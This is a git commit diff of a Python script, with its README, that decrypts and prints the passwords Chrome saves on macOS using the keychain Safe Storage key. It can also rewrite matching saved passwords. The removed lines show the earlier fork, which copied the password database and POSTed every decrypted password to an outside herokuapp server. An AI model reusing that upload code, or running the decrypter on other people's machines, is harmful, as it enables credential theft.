4cda489ba861cf2275eac4e65ce96173dbc1b8b7
hubert3 <947995+hubert3@users.noreply.github.com>
2022-12-26 00:03:20 +0100

    Initial commit

--- README.md
+++ README.md
@@ -1,2 +1,52 @@
-# chrome-passwords-mac
-This is a python script that gets the passwords stored by google chrome on a mac computer, prints them out and sends to a server whose code is on my repository.
+chrome-passwords-mac
+====================
+
+Forked from https://github.com/mooredh/chrome-passwords-mac
+
+This python script decrypts and prints the website passwords saved by Chrome on Mac.
+
+It can also update all passwords matching a certain base password to a new password in the Chrome password DB.
+
+Working as of 2022-12-25 with: 
+
+* Mac OS Ventura 13.1
+* Chrome 108.0.5359.124 (Official Build) (arm64 or x86_64)
+* Python 3.9.6 (Ventura default)
+
+Instructions
+------------
+
+`pip3 install pycryptodome` (3.16.0 works)
+
+(Should be installed into /usr/local/lib/python3.9/site-packages/Crypto if using Python 3.9 from Homebrew. If you have an existing lowercase 'crypto' folder here from an older Python crypto module you need to delete this first)
+
+Quit Chrome before running the script. 
+
+You will be asked to authenticate with your Mac login once for keychain access.
+
+Run:
+
+`% ./getPassword-mac.py | less -R`
+
+To dump your Chrome passwords and page through the output with colours.
+
+Use `-b <base password>` to show URLs and passwords which contain this base password
+
+Use `-b <base password>` together with `-n <new password>` to update all matching passwords to the specified new password.
+
+```% ./getPassword-mac.py -h
+usage: getPassword-mac.py [-h] [-f [FILE]] [-b [BASE]] [-n [NEW]]
+
+Decrypt and update Chrome saved passwords for websites
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -f [FILE], --file [FILE]
+                        Chrome browser "Login Data" database file location (default ~/Library/Application Support/Google/Chrome/Default/Login Data)
+  -b [BASE], --base [BASE]
+                        Base password to match
+  -n [NEW], --new [NEW]
+                        New password to set for all entries matching base password
+
+
+```
--- getPassword-mac.py
+++ getPassword-mac.py
@@ -1,47 +1,80 @@
-import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob, requests
+#!/usr/local/bin/python3
+
+import sqlite3, os, binascii, subprocess, base64, sys, hashlib, argparse
 from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-os.system('cp %s/Library/"Application Support"/Google/Chrome/Profile*/Default/"Login Data" %s/Downloads' % (os.path.expanduser("~"), os.path.expanduser("~")))
-os.system('cp %s/Library/"Application Support"/Google/Chrome/Default/"Login Data" %s/Downloads' % (os.path.expanduser("~"), os.path.expanduser("~")))
-
-loginData = glob.glob("%s/Downloads" % os.path.expanduser("~"))
+parser = argparse.ArgumentParser(description='Decrypt and update Chrome saved passwords for websites')
+parser.add_argument('-f','--file', nargs='?', help='Chrome browser "Login Data" database file location (default ~/Library/Application Support/Google/Chrome/Default/Login Data)', default='%s/Library/Application Support/Google/Chrome/Default/Login Data' % os.path.expanduser("~"))
+parser.add_argument('-b','--base', nargs='?', help='Base password to match')
+parser.add_argument('-n','--new', nargs='?', help='New password to set for all entries matching base password')
+args = parser.parse_args()
 
 safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).decode().replace("\n", "").replace("\"", "").encode()
 if safeStorageKey == "":
     print("ERROR getting Chrome Safe Storage Key")
     sys.exit()
 
+loginData = [args.file]
+
+database = sqlite3.connect('file:%s' % loginData[0], uri=True)
+iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
+key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
+
+changePassOutput = 'Looking for passwords matching %s\n\n' % args.base
+encryptedPasswordsToUpdate = set()
+encryptedNewPass = ''
+
+def chromeEncrypt(plaintext, iv, key=None):
+    hexIv = binascii.unhexlify(iv)
+    cipher = AES.new(key, AES.MODE_CBC, hexIv)
+    paddedPlaintext = pad(plaintext.encode('utf-8'), 32)
+    ciphertext = cipher.encrypt(paddedPlaintext)
+    return(b'v10'+ciphertext)
+
 def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
     hexIv = binascii.unhexlify(iv)
     hexEncPassword = base64.b64encode(encrypted_value[3:])
     cipher = AES.new(key, AES.MODE_CBC, hexIv)
-    return cipher.decrypt(encrypted_value[3:]).decode()
+    plaintext = unpad(cipher.decrypt(encrypted_value[3:]), 16).decode()
+    #print ('Cipher: %s\nPlain:  %s\nRe-enc: %s\n' % (hexEncPassword, plaintext, chromeEncrypt(plaintext, iv, key)))
+    return(plaintext)
 
-def chromeProcess(safeStorageKey, loginData):
-    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
-    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
-    # fd = os.open(loginData, os.O_RDONLY) #open as read only
-    database = sqlite3.connect('file:%s/Login data' % loginData, uri=True)
-    # os.close(fd)
+def chromeProcess(safeStorageKey, profile):
+    global changePassOutput, iv, key, database, encryptedPasswordsToUpdate
+
     sql = 'select username_value, password_value, origin_url from logins'
     decryptedList = []
     with database:
         for user, encryptedPass, url in database.execute(sql):
             if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                 continue
+
             else:
-                urlUserPassDecrypted = (url, user, chromeDecrypt(encryptedPass, iv, key=key))
+                decryptedPass = chromeDecrypt(encryptedPass, iv, key=key)
+                if args.base and args.base.lower() in decryptedPass.lower():
+                    changePassOutput += '\033[1m%s\033[0m \033[32mPass:\033[0m %s\n' % (url, decryptedPass)
+                    encryptedPasswordsToUpdate.add(encryptedPass)
+                urlUserPassDecrypted = (url, user, decryptedPass)
                 decryptedList.append(urlUserPassDecrypted)
     return decryptedList
 
-email = ""
+# main
 
+output = "\n"
 for profile in loginData:
     for i, x in enumerate(chromeProcess(safeStorageKey, "%s" % profile)):
-        email += "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
+        output += "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
 
-print(email)
+print(output)
 
-r = requests.post(url='https://x666pwg.herokuapp.com/x666pwg', json={ "data": email }, headers={ "Content-Type": "application/json" })
+if args.base:
+    print(changePassOutput)
 
-print(r.json())
+    if args.new:
+        if not input("Changing above saved passwords to %s\n\nAre you sure? (y/n): " % args.new).lower().strip()[:1] == "y":
+            sys.exit(1)
+        encryptedNewPass = chromeEncrypt(args.new, iv, key)
+        with database:
+            for pwd in encryptedPasswordsToUpdate:
+                database.execute('update logins set password_value = ? where password_value = ?', (encryptedNewPass, pwd))
